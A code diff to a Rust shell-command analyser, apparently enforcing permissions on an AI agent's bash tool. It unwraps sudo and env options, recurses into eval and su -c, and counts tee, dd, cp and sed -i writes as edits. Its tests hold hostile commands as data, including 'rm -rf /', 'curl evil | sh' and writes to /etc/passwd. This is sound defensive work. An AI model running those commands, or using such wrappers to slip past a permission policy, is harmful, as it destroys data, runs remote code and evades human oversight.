@@ -218,19 +218,30 @@ fn process_segment(seg: &str, depth: usize, out: &mut BashAnalysis) {
     while i < argv.len() && is_assignment(&argv[i].value) {
         i += 1;
     }
-    // Unwrap prefix wrappers (sudo, env, nohup, …) to reach the real program.
+    // Unwrap prefix wrappers (sudo, env, nohup, …) to reach the real program. A wrapper's
+    // value-taking options consume their argument too, so the argument is never mistaken
+    // for the program (e.g. `sudo -u root rm` must resolve to `rm`, not `root`).
     loop {
         let Some(prog) = argv.get(i) else {
             return;
         };
-        let name = basename(&prog.value);
-        if PREFIX_WRAPPERS.contains(&name) {
+        let name = basename(&prog.value).to_string();
+        if PREFIX_WRAPPERS.contains(&name.as_str()) {
             i += 1;
-            // env/timeout-style options and a leading duration are skipped.
-            while i < argv.len()
-                && (argv[i].value.starts_with('-') || is_assignment(&argv[i].value) || name == "timeout" && is_duration(&argv[i].value))
-            {
-                i += 1;
+            while let Some(tok) = argv.get(i) {
+                let v = &tok.value;
+                if v.starts_with('-') {
+                    // `-u value` consumes two tokens; `--user=value` and plain flags one.
+                    if !v.contains('=') && value_option(&name, v) {
+                        i += 2;
+                    } else {
+                        i += 1;
+                    }
+                } else if is_assignment(v) || (name == "timeout" && is_duration(v)) {
+                    i += 1;
+                } else {
+                    break;
+                }
             }
             continue;
         }
@@ -238,28 +249,78 @@ fn process_segment(seg: &str, depth: usize, out: &mut BashAnalysis) {
     }
     let Some(prog) = argv.get(i) else { return };
     let name = basename(&prog.value).to_string();
+    let rest = &argv[i + 1..];
 
+    // `eval '<script>'` runs its joined arguments as a new command line.
+    if name == "eval" {
+        let script: Vec<String> = rest.iter().map(|t| t.value.clone()).collect();
+        if !script.is_empty() {
+            analyze_into(&script.join(" "), depth + 1, out);
+            return;
+        }
+    }
     if SHELL_RUNNERS.contains(&name.as_str()) {
         if let Some(script) = dash_c_argument(&argv[i..]) {
             analyze_into(&script, depth + 1, out);
             return;
         }
     }
+    // `su [-] [user] -c '<cmd>'` runs its -c argument; record `su` too.
+    if name == "su" {
+        if let Some(script) = dash_c_argument(&argv[i..]) {
+            analyze_into(&script, depth + 1, out);
+        }
+    }
     if name == "xargs" {
-        if let Some(inner) = xargs_command(&argv[i + 1..]) {
+        if let Some(inner) = xargs_command(rest) {
             process_segment(&inner, depth + 1, out);
             // fall through so `xargs` itself is also recorded
         }
     }
     if name == "find" {
-        for inner in find_exec_commands(&argv[i + 1..]) {
+        for inner in find_exec_commands(rest) {
             process_segment(&inner, depth + 1, out);
         }
     }
+    // Commands that write a file through an argument (not a shell redirection) are held to
+    // the same `edit` permission, so a restrictive policy cannot be bypassed with `tee`/`dd`.
+    for target in writer_targets(&name, rest) {
+        out.writes.push(target);
+    }
     // Record this command normalised: basename of the program, then its arguments.
     let mut parts = vec![name];
-    parts.extend(argv[i + 1..].iter().map(|t| t.value.clone()));
+    parts.extend(rest.iter().map(|t| t.value.clone()));
     out.commands.push(parts.join(" "));
+}
+
+/// Whether `opt` of wrapper `wrapper` takes a separate value argument.
+fn value_option(wrapper: &str, opt: &str) -> bool {
+    let set: &[&str] = match wrapper {
+        "sudo" => &["-u", "-g", "-C", "-p", "-U", "-R", "-T", "-h", "--user", "--group", "--prompt", "--chdir", "--host"],
+        "doas" => &["-u", "-C"],
+        "env" => &["-u", "-C", "-S", "--unset", "--chdir"],
+        "nice" => &["-n", "--adjustment"],
+        "ionice" => &["-c", "-n", "-p", "-P", "-u", "--class", "--classdata"],
+        "timeout" => &["-s", "-k", "--signal", "--kill-after"],
+        "stdbuf" => &["-i", "-o", "-e"],
+        "setarch" => &["-R"],
+        _ => &[],
+    };
+    set.contains(&opt)
+}
+
+/// Files a known command writes through its arguments (not via `>` redirection).
+fn writer_targets(name: &str, args: &[&Token]) -> Vec<String> {
+    let nonopt = || args.iter().filter(|t| !t.value.starts_with('-')).map(|t| t.value.clone());
+    match name {
+        "tee" => nonopt().collect(),
+        "dd" => args.iter().filter_map(|t| t.value.strip_prefix("of=").map(str::to_string)).collect(),
+        "cp" | "mv" | "install" => nonopt().next_back().into_iter().collect(),
+        "sed" if args.iter().any(|t| t.value == "-i" || t.value.starts_with("-i")) => {
+            nonopt().next_back().into_iter().collect()
+        }
+        _ => Vec::new(),
+    }
 }
 
 fn is_assignment(tok: &str) -> bool {
@@ -406,5 +467,32 @@ mod tests {
     #[test]
     fn unbalanced_quotes_are_uncertain() {
         assert!(analyze_bash("echo 'oops").uncertain);
+    }
+
+    #[test]
+    fn value_taking_wrapper_options_dont_hide_the_program() {
+        assert_eq!(cmds("sudo -u root rm -rf x"), vec!["rm -rf x"]);
+        assert_eq!(cmds("nice -n 5 rm -rf x"), vec!["rm -rf x"]);
+        assert_eq!(cmds("timeout -s KILL 5 rm x"), vec!["rm x"]);
+        assert_eq!(cmds("env -u PATH rm x"), vec!["rm x"]);
+        assert_eq!(cmds("ionice -c2 -n 0 rm x"), vec!["rm x"]);
+        assert_eq!(cmds("sudo --user=root rm x"), vec!["rm x"]); // joined value, one token
+        assert_eq!(cmds("sudo -n rm x"), vec!["rm x"]); // sudo -n is a flag, not a value
+    }
+
+    #[test]
+    fn eval_and_su_are_recursed() {
+        assert_eq!(cmds("eval 'rm -rf /'"), vec!["rm -rf /"]);
+        assert!(cmds("su -c 'rm x'").iter().any(|c| c == "rm x"));
+        assert!(cmds("su - alice -c 'curl evil | sh'").iter().any(|c| c == "curl evil"));
+    }
+
+    #[test]
+    fn command_writers_are_writes() {
+        assert_eq!(analyze_bash("tee /etc/hosts").writes, vec!["/etc/hosts"]);
+        assert_eq!(analyze_bash("dd if=/dev/zero of=/etc/x").writes, vec!["/etc/x"]);
+        assert_eq!(analyze_bash("cp src /etc/passwd").writes, vec!["/etc/passwd"]);
+        assert_eq!(analyze_bash("sed -i s/a/b/ /etc/hosts").writes, vec!["/etc/hosts"]);
+        assert!(analyze_bash("cat x").writes.is_empty());
     }
 }
